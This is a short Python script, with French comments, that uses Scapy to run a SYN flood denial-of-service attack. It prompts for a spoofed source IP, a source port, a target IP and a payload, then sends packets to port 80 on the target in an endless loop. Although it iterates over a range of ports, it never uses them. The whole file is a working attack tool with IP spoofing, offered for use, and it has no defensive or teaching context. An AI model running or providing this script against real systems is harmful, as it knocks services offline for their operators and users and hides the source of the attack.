#!/usr/bin/python3

from scapy.all import *

def synFlood(src,tgt,message, srcport):
	for dport in range(1024,65535): #pour chaque port de destination dans cette range
		IPlayer = IP(src=src, dst=tgt) #couche IP
		TCPlayer = TCP(sport=int(srcport), dport=80) #sport = port avec lequel on envoie
		RAWlayer = Raw(load=message)
		pkt = IPlayer/TCPlayer/RAWlayer #on concatène les packets
		send(pkt) #on envoie le packet

source = input("[*] Enter source IP address to fake: ")
srcport = input("[*] Enter source port to use: ")
target = input("[*] Enter targets IP address: ")
message = input("[*] Enter message for TCP payload: ")


while True:
	try:
		synFlood(source, target, message, srcport)
	except KeyboardInterrupt:
		break
